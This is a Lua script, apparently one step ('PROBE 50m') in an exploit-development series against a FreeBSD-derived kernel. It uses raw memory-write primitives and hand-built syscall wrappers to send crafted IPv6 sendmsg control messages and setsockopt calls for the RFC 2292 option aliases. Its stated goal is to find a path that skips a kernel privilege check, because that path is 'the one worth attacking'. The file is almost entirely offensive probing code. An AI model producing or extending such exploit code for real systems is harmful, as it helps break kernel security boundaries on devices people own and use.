-- CRASH_CLASS: LOW
-- PROBE 50m: RFC 2292 cmsg numbers on the corrected layout
--
-- 50l showed the RFC 3542 option cmsgs behave exactly like FreeBSD 9: value
-- options are validated (length, range, ifindex) and every extension-header
-- option (HOPOPTS 49, DSTOPTS 50, RTHDR 51, RTHDRDSTOPTS 35) fails even in its
-- valid shape, which is what a priv_check(PRIV_NETINET_SETHDROPTS) refusal
-- looks like from outside.
--
-- This probe asks the same kernel about the RFC 2292 aliases 19-25, which
-- take a separate case label in ip6_setpktopt and are legal in cmsg context.
-- If PRIV_NETINET_SETHDROPTS is the gate, 2292HOPOPTS (22), 2292DSTOPTS (23)
-- and 2292RTHDR (24) must fail too; if the aliases skip the gate they will
-- send, and that path is the one worth attacking.

print("=== PROBE 50m: 2292 cmsg aliases ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rbyte(a) local ok,v=pcall(function() return memory.read_byte(a) end) if ok then return to_num(v) end return -1 end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(f,...) local ok,rv=pcall(f,...) if not ok then return -999 end return to_num(rv) end
local function pid() return to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)) end

local SYS_socket, SYS_sendmsg, SYS_connect, SYS_bind, SYS_getsockname = 97, 28, 98, 104, 32
local AF_INET6, SOCK_DGRAM, IPPROTO_UDP, IPPROTO_IPV6 = 28, 2, 17, 41
local DATA = 16

local srv = call(mk(SYS_socket), uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
local srv_sa = memory.alloc(0x40); zero(srv_sa, 0x40)
wb(srv_sa, 28); wb(srv_sa + 1, 28)
local br = call(mk(SYS_bind), uint64(srv), uint64(srv_sa), uint64(28))
local lenp = memory.alloc(8); zero(lenp, 8); wd(lenp, 28)
call(mk(SYS_getsockname), uint64(srv), uint64(srv_sa), uint64(lenp))
local port = rbyte(srv_sa + 2) * 256 + rbyte(srv_sa + 3)
print(string.format("[0] srv=%d bind=%d port=%d pid=%s", srv, br, port, tostring(pid())))

local fd = call(mk(SYS_socket), uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP))
local sa = memory.alloc(0x40); zero(sa, 0x40)
wb(sa, 28); wb(sa + 1, 28)
wb(sa + 2, math.floor(port / 256)); wb(sa + 3, port % 256)
wb(sa + 23, 1)
print("[1] connect=" .. call(mk(SYS_connect), uint64(fd), uint64(sa), uint64(28)))

local data = memory.alloc(0x40); zero(data, 0x40); wd(data, 0x41414141)
local iov = memory.alloc(0x20); zero(iov, 0x20)
wq(iov, data); wq(iov + 8, 4)
local ctrl = memory.alloc(0x1000); zero(ctrl, 0x1000)
local mh = memory.alloc(0x80); zero(mh, 0x80)
wq(mh + 16, iov); wq(mh + 24, 1); wq(mh + 32, ctrl)

local function send(n)
    wq(mh + 40, n)
    return call(mk(SYS_sendmsg), uint64(fd), uint64(mh), uint64(0))
end
local function cmsg(off, data_len, level, type)
    wd(ctrl + off, DATA + data_len)
    wd(ctrl + off + 4, level)
    wd(ctrl + off + 8, type)
    local sp = DATA + data_len
    sp = (sp + 7) - ((sp + 7) % 8)
    return off + sp
end
local function d32(i, v) wd(ctrl + DATA + i, v) end
local function d(i, v) wb(ctrl + DATA + i, v) end

print("")
print("  case                                   ret")
local function run(tag, fn)
    zero(ctrl, 0x1000)
    local r = send(fn())
    print(string.format("  %-38s %s", tag, tostring(r)))
    if pid() == 0 then print("  [!] process died"); return false end
    return true
end

run("19 2292PKTINFO 20 bytes", function() cmsg(0, 20, IPPROTO_IPV6, 19); return 40 end)
run("19 2292PKTINFO 4 bytes", function() cmsg(0, 4, IPPROTO_IPV6, 19); return 24 end)
run("20 2292HOPLIMIT 4 bytes=5", function() cmsg(0, 4, IPPROTO_IPV6, 20); d32(0, 5); return 24 end)
run("20 2292HOPLIMIT 4 bytes=300", function() cmsg(0, 4, IPPROTO_IPV6, 20); d32(0, 300); return 24 end)
run("21 2292NEXTHOP 8 bytes", function() cmsg(0, 8, IPPROTO_IPV6, 21); return 24 end)
run("22 2292HOPOPTS 8 bytes hdrlen0", function() cmsg(0, 8, IPPROTO_IPV6, 22); return 24 end)
run("23 2292DSTOPTS 8 bytes hdrlen0", function() cmsg(0, 8, IPPROTO_IPV6, 23); return 24 end)
run("24 2292RTHDR 8 bytes rlen0 seg0", function() cmsg(0, 8, IPPROTO_IPV6, 24); return 24 end)
run("24 2292RTHDR 8 bytes rlen255 seg1", function()
    cmsg(0, 8, IPPROTO_IPV6, 24); d(1, 255); d(3, 1); return 24 end)
run("25 2292PKTOPTIONS 8 bytes", function() cmsg(0, 8, IPPROTO_IPV6, 25); return 24 end)
run("control: PKTINFO 20 bytes (known good)", function()
    cmsg(0, 20, IPPROTO_IPV6, 46); return 40 end)

print("")
print("--- sticky variants via setsockopt, same numbers ---")
for _, T in ipairs({46, 47, 61, 19, 20, 22, 23, 24}) do
    local b = memory.alloc(0x40); zero(b, 0x40)
    wd(b, 1)
    local r = call(mk(105), uint64(fd), uint64(IPPROTO_IPV6), uint64(T), uint64(b), uint64(4))
    print(string.format("  setsockopt type=%-3d len=4 ret=%s", T, tostring(r)))
end

print("[Z] alive=" .. tostring(pid()))
pcall(function() mk(6)(uint64(fd)) end)
pcall(function() mk(6)(uint64(srv)) end)
print("=== PROBE 50m COMPLETE ===")
